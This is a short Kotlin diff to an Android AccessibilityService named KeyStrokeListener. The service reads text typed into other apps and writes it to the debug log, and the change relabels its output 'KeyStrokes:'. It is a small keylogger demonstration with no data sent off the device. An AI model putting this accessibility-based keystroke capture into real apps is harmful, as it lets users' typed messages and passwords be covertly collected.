@@ -10,15 +10,12 @@ class KeyStrokeListener : AccessibilityService() {
         val eventType = event.eventType
         var eventText: String? = null
         when (eventType) {
-            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> eventText = "Typed: "
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> eventText = "KeyStrokes: "
         }
         eventText = eventText!! + event.text
-        //print the typed text in the console. Or do anything you want here.
         if (eventText.contains("android"))
             Log.d("ACCESSIBILITY SERVICE:", " ${eventText.replace("android", "hacker")}")
-        Log.d("ACCESSIBILITY SERVICE:", " $eventText")
+        //Log.d("ACCESSIBILITY SERVICE:", " $eventText")
     }
-
-    override fun onInterrupt() {
-    }
+    override fun onInterrupt() {}
 }
